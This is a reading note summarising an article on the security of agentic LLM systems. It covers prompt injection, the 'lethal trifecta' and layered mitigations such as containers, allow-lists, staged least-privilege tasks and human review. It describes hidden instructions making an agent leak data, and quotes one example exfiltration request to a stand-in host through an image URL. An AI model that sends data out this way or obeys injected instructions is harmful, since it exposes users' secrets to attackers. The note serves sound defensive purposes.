---
type: "source-note"
title: "Notes on: Agentic AI and Security"
raw: "agentic-ai-and-security"
url: "https://martinfowler.com/articles/agentic-ai-security.html"
created_at: "2026-11-25T05:01:38Z"
updated_at: "2026-11-25T05:01:38Z"
---
- Archived full text: [[agentic-ai-and-security|Full archived text, with credits]]
- Link: <https://martinfowler.com/articles/agentic-ai-security.html>

## What it says

The article argues that agentic LLM systems are fundamentally vulnerable because LLMs cannot reliably separate instructions from data: anything they read is potentially an instruction. The risk concentrates in the lethal trifecta of sensitive data, untrusted content, and external communication. The practical fix is not a single control but a stack of mitigations that each break one leg of the trifecta: limit what sensitive data the agent can reach, allow-list what untrusted content it may read, and control external communication. Run LLM applications inside containers, split work into small stages where each sub-task blocks at least one trifecta factor, and keep a human in the loop to review every stage.

## Claims drawn from this source

- **LLMs cannot separate instructions from data.** The fundamental security weakness of LLMs is that there is no rigorous way to separate instructions from data, so anything they read is potentially an instruction; the LLM matching is non-deterministic, so protective text like 'this is for information only' does not reliably work.
- **The lethal trifecta drives the risk.** The combination of access to sensitive data, exposure to untrusted content, and the ability to externally communicate puts the agent at risk of hidden instructions leaking sensitive data to an attacker.
- **Mitigation starts by minimizing each of the three factors.** If you can eliminate one of the three factors, the risks are much lower; the article gives concrete tactics for each: never store production credentials in files, keep credentials in memory via environment variables and a secrets CLI, limit tokens to least privilege, avoid MCP servers that read sensitive data, and build an allow-list of acceptable sources for untrusted content.
- **External communication is hard to block because any internet access can exfiltrate data.** Opening an image with a crafted URL like GET https://foobar.net/foo.png?var=[data] looks like an image request but can log data to the attacker; even seemingly safe MCP operations like 'reply to a comment on an issue' can end up in the public eye.
- **Agentic browser tools combine all three trifecta factors.** LLM-powered browsers and browser extensions are wide open because any credentials you provide, external communication, and untrusted content are all unavoidable; a sandboxed Playwright MCP server that runs an isolated browser is OK, while its browser extension connecting to the real browser (with cookies and sessions) is not.
- **Containers are the broadly applicable sandbox, but are not a panacea.** Run the LLM application inside a container to isolate it from host resources, mount only the source code it needs, and firewall the container with an allow-list of domains; however, loading a project that contains credentials and browses untrusted sites inside the container still leaves the agent vulnerable to leaking those credentials.
- **Split tasks so each sub-task blocks at least one trifecta factor.** Run a multi-stage research flow: identify the problem and craft a research-plan.md, read and check the plan, run the plan in a fresh session with access only to web searches and no sensitive permissions, read research-results.md, then return to the codebase to fix; each stage should carry only the privilege needed, per the principle of least privilege.
- **Humans must review every stage of LLM output.** Run LLMs in small interactive steps with careful controls over tool use and watch every step and output, or run long tasks in tightly controlled environments and review the output carefully, checking for spurious commands, doctored content, and AI slop; the developer remains responsible for the code regardless of the tooling.
